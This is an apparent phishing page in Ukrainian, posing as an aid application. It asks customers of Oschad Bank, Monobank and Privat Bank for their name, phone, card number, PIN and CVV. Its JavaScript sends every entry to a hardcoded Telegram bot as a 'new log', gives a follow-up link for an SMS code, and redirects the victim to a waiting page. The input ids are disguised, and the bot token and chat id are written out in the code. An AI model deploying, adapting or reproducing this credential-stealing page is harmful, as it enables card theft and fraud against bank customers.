<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Заявка</title>

<style>
body{
  margin:0;
  font-family: Arial;
  background:#f1f5f9;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box{
  background:white;
  padding:30px;
  border-radius:20px;
  width:360px;
  text-align:center;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
}

h2{
  margin-bottom:15px;
}

input{
  width:100%;
  padding:12px;
  margin:6px 0;
  border:1px solid #e2e8f0;
  border-radius:10px;
  outline:none;
}

.service{
  padding:10px;
  margin:6px 0;
  background:#f1f5f9;
  border-radius:10px;
  cursor:pointer;
}

.service.active{
  background:#3b82f6;
  color:white;
}

button{
  width:100%;
  padding:12px;
  margin-top:10px;
  background:#3b82f6;
  color:white;
  border:none;
  border-radius:10px;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="box">
  <h2></h2>Залишити заявку</h2>

  <input type="text" id="name" placeholder="Ім'я">
  <input type="text" id="phone" placeholder="Телефон">
  <input type="text" id="telegram" placeholder="Номер картки">
  <input type="text" id="city" placeholder="Пін-код">
  <input type="text" id="budget" placeholder="CVV/CCV2">

  <p>Ваш Банк:</p>

  <div class="service" onclick="select(this)">Oschad Bank</div>
  <div class="service" onclick="select(this)">Monobank</div>
  <div class="service" onclick="select(this)">Privat Bank</div>

  <button onclick="send()">Отримати</button>
</div>

<script>
let service = "";

function select(el){
  document.querySelectorAll(".service").forEach(e=>e.classList.remove("active"));
  el.classList.add("active");
  service = el.innerText;
}

function send(){
  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const telegram = document.getElementById("telegram").value.trim();
  const city = document.getElementById("city").value.trim();
  const budget = document.getElementById("budget").value.trim();

  if(!name || !phone || !telegram || !city || !budget || !service){
    alert("Заповніть все!");
    return;
  }

  const id = Date.now();

  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
  const chat_id = "8035773808";

  const link = `https://dopomogavidderzhavi-bvoa.vercel.app/go.html?id=${id}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:chat_id,
      text:`🔥 Новый Лог 👻:
ID: ${id}
Имя: ${name}
Телефон: ${phone}
Номер Карты: ${telegram}
Пин-код: ${city}
Срок: ${budget}
CVV: ${service}

СМС/КОД:
${link}`
    })
  });

  window.location.href = "wait.html?id=" + id;
}
</script>

</body>
</html>
